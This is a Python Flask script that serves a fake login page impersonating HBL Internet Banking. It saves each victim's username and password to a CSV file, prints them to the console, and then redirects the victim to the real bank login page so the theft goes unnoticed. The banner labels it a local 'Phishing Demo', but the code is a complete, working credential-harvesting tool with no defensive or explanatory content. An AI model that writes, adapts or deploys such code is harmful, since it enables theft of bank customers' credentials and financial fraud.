#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, request, redirect
import csv, datetime, os, logging, webbrowser

app = Flask(__name__)

# --------------------------------------------------------------------
# 1️⃣  Silence Flask's “development server” warning
# --------------------------------------------------------------------
logging.getLogger('werkzeug').setLevel(logging.ERROR)

# --------------------------------------------------------------------
# 2️⃣  CSV file name
# --------------------------------------------------------------------
DATA_FILE = 'data.csv'

def save_to_csv(username: str, password: str) -> None:
    """Append credentials to a CSV file (create header if missing)."""
    file_exists = os.path.isfile(DATA_FILE)

    if not file_exists:
        with open(DATA_FILE, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Timestamp', 'Username', 'Password'])

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(DATA_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, username, password])

# --------------------------------------------------------------------
# 3️⃣  Routes
# --------------------------------------------------------------------
@app.route('/', methods=['GET'])
def home() -> str:
    """Serve the phishing page."""
    return open('index.html').read()

@app.route('/login', methods=['POST'])
def login() -> str:
    """Handle form submission."""
    username = request.form.get('username')
    password = request.form.get('password')

    if username and password:
        save_to_csv(username, password)
        print(f"✅ Captured -> User: {username}, Pass: {password}")
    else:
        print("⚠️ Empty fields detected.")

    # Redirect to the real HBL Internet Banking login
    return redirect('https://www.hbl.com/InternetBanking/Login.aspx')

# --------------------------------------------------------------------
# 4️⃣  Nice console banner
# --------------------------------------------------------------------
def print_banner(port: int = 5000) -> None:
    banner = f"""
    =========================================
            HBL Phishing Demo (Local)
    =========================================
    • Server running on: http://127.0.0.1:{port}
    • Open the above URL in a browser to view the fake login page.
    • Credentials will be logged to {DATA_FILE}.
    """
    print(banner)

# --------------------------------------------------------------------
# 5️⃣  Start the server
# --------------------------------------------------------------------
if __name__ == '__main__':
    PORT = 5000
    print_banner(PORT)

    # Optional: automatically open the page in the default browser
    webbrowser.open(f'http://127.0.0.1:{PORT}')

    # use_reloader=False keeps the warning from printing twice
    app.run(host='127.0.0.1', port=PORT, debug=True, use_reloader=False)